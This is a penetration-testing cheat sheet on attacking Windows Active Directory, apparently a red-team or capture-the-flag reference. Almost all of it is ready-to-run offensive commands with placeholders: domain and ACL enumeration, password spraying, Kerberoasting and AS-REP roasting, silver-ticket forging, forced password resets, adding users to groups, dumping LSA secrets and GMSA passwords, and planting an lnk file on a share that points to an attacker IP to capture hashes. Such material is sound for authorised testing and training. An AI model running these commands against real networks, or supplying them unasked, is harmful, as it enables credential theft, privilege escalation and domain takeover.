# Active-Directory and Lateral Movement
## Enumeration

### PowerView
```Powershell
Import-Module .\PowerView.ps1

# Create PSCredential Object if used with WINRM/ another user
$Pass = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $Pass)

# Get Information About User
Get-DomainUser <USERNAME>

# Get ALL ACLs of a provided SID
$SID = (Get-DomainUser -Identity USERNAME).objectsid
Get-DomainObjectACL -Identity * -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $SID}

# Automatic Scan for interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceSID -eq $SID}

# Add User to a Group
Add-DomainGroupMember -Identity <GROUP> -Members <USERNAME> -Credential $Cred

# Change User's Password
Set-DomainUserPassword -Identity TARGET -AccountPassword NEW_PASS $Creds

# Show all Deleted Objects
Get-DomainUser -IncludeDeleted | ? {$_.IsDeleted -eq $true} | Select-Object name, samaccountname, description, useraccountcontrol

# Search specific deleted object
Get-DomainObject -IncludeDeleted -Identity "target_user"

# Search for users with SPN set
Get-DomainUser -SPN

# Search for users with no Kerberos Pre Auth (ASREP ROAST)
Get-DomainUser -PreauthNotRequired

# Check for local admin access
Find-LocalAdminAccess

# Find user sessions (requires local admin)
Get-NetSession

# Find all Computers in a network
Get-DomainComputer

# Find trusts against other domains
Get-DomainTrust

# Find GPO related to specific Organizational Units
Get-DomainOU | Select-Object name, gplink

# Find all GPOs
Get-DomainGPO | Select-Object DisplayName, GPCPath
```
### SharpHound
```Powershell
# SharpHound.exe (Creds needed if used through WINRM)
.\SharpHound.exe -c All (-ldapusername USER -ldappassword PASSWORD)

# SharpHound.ps1 (Creds needed if used through WINRM)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory .\ (-OutputPrefix Prefix -ldapusername USER -ldappassword PASSWORD)

# Bloodhound-python
bloodhound-python -c All -u USER -p PASSWORD (--hashes HASHES) -d DOMAIN -ns NAMESERVER
-dc DomainController --zip ZipFileName
```

### LDAP
```bash
# Null authentication and getting DN
ldapsearch -x -H ldap://TARGET_IP -s base namingContexts

# Get ALL information
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=*)"

# Get all users
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=user)"

# Get all groups
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=group)"

# Get all computers
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=computer)"

# Get all objects set to "person"
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=person)"

# Get all organizationalunits
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=organizationalunit)"

# Authenticated bind
ldapsearch -x -H ldap://TARGET_IP -D "username@domain.local" -w "PASSWORD" -b "DC=domain,DC=local"

# Get all users with a description
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'Password123!' \
-b "DC=domain,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description
```
## Authentication Attacks
### Password-Spraying
#### Linux
```bash
# kerbrute
kerbrute passwordspray -d DOMAIN --dc DomainController username_wordlist "PASSWORD"
# spray username as password
kerbrute passwordspray -d DOMAIN --dc DomainController username_wordlist --user-as-pass

# netexec
nxc smb TARGET_IP -u users_list -p PASSWORD --continue-on-success
# spray username as password
nxc smb TARGET_IP -u users_list -p users_list --no-bruteforce --continue-on-success
```

#### Windows
```Powershell
# DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray --Password PASSWORD -OutFile spray_success -ErrorAction SilentlyContinue

# Spray-Passwords.ps1
.\Spray-Passwords.ps1 -Pass PASSWORD -Admin

# kerbrute
.\kerbrute_windows_amd64.exe passwordspray -d DOMAIN username_wordlist "PASSWORD"

```
### Kerberos

### Kerberos Clock Skew Fix
```bash
# Sync timezone - Run as root or use sudo
rdate -n DC_IP
ntpdate DC_IP

# Fake timezone
faketime "$(ntpdate -q DC_IP | cut -d ' ' -f 1,2)" <COMMAND>
```

### Kerberoasting
```bash
# impacket
impacket-GetUserSPNs DOMAIN/USER:PASSWORD -dc-ip DomainController -request (-request-user USER)

# Rubeus
.\Rubeus.exe kerberoast /nowrap (/user:specificuser)

# targeted Kerberoast
python targetedKerberoast.py -u USER -p PASSWORD --dc-ip DomainController

# PowerView
Invoke-Kerberoast -OutputFormat Hashcat

# Netexec
nxc ldap TARGET_IP -u USER -p PASS --kerberoast FILENAME
```

### AS-REP Roasting
```bash
# impacket
impacket-GetNPUsers DOMAIN/USER:PASSWORD -dc-ip DomainController -request

# Pre-Auth disabled
impacket-GetNPUsers DOMAIN/USER -dc-ip DomainController -no-pass -request

# List of users
impacket-GetNPUsers DOMAIN/ -usersfile LIST -no-pass -dc-ip DomainController -request

# Rubeus
.\Rubeus.exe asreproast /nowrap

# nxc
nxc ldap TARGET_IP -u USER -p PASS --asreproast FILENAME

# No pre auth
nxc ldap TARGET_IP -u TARGETUSER --no-preauth-targets FILENAME
```

### Ticket Attacks
```bash
# generate krb5 file
nxc smb DomainController -u USER -p PASS --generate-krb5-file

# Get TGT
impacket-getTGT DOMAIN/USER:PASSWORD -dc-ip DomainControllerHostName

# Use ticket
export KRB5CCNAME=Ticket.ccache

# Convert ticket
impacket-ticketConverter ticket.kirbi ticket.ccache

# Silver ticket - as service account
impacket-ticketer -nthash NTLM -domain-sid SID -domain DOMAIN.LOCAL -spn SPN -user-id 500 Administrator
```

## bloodyAD
```bash
# Force change user password
bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM] set password 'TargetUser' 'NewPassword'

# Enumerate all deleted objects
bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM]
get search -c "1.2.840.113556.1.4.2064" --base "TargetDistinguishedName" --filter "(sAMAccountName=username*)" --attr "*"

# Restore Deleted Object
bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM] set restore "ObjectSID"

# Add user to group
bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM] add groupMember "TargetGroup" "TargetUser"

# Check Group Membership
bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM]
get membership "TargetUser"

# Search specific object (Could use samaccountname or DN instead of SID)
bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM] get object 'ObjectSID'
```

## NetExec
```bash
# Dump lsa
nxc smb TARGET_IP -u USER -p PASS --lsa

# Find password policy
nxc smb TARGET_IP -u USER -p PASS --pass-pol

# Find certificate authority
nxc smb TARGET_IP -u USER -p PASS -M adcs

# Write lnk file to a writeable share
nxc smb TARGET_IP -u USER -p PASS -M slinky -o SERVER=ATTACK_IP NAME=FILENAME

# Automatic enumeration share enumeration
nxc smb TARGET_IP -u USER -p PASS -M spider_plus (--share SHARE_NAME)

# Useful if only nxc manages to connect with RDP
nxc rdp TARGET_IP -u USER -p PASS -x COMMAND

# Read GMSA password
nxc ldap TARGET_IP -u USER -p PASS --gmsa

```